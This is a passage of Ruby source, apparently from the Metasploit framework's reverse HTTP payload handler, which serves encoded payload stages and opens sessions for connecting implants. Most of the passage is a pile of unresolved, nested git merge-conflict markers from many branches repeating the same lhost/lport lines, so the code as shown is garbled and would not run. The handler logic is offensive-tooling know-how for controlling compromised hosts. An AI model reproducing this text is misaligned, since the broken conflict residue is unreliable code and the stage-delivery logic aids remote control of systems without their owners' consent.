          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> 4.11.2_release_pre-rails4
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> msf-complex-payloads
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> msf-complex-payloads
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> payload-generator.rb
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
<<<<<<< HEAD
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
=======
          lhost: uri.host,
          lport: uri.port
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
        )

        resp.body = encode_stage(blob)

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })

      when :connect
        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Attaching orphaned/stageless session ...")

        resp.body = ''
        conn_id = req.relative_resource

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => payload_uri(req) + conn_id + "/\x00",
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :retry_total        => datastore['SessionRetryTotal'].to_i,
          :retry_wait         => datastore['SessionRetryWait'].to_i,
          :ssl                => ssl?,
          :payload_uuid       => uuid
        })

      else
        unless [:unknown_uuid, :unknown_uuid_url].include?(info[:mode])
          print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{request_summary}")
        end
        resp.code    = 200
        resp.message = 'OK'
        resp.body    = datastore['HttpUnknownRequestResponse'].to_s
        self.pending_connections -= 1
    end

    cli.send_response(resp) if (resp)

    # Force this socket to be closed
    obj.service.close_client( cli )
  end

end

end
end

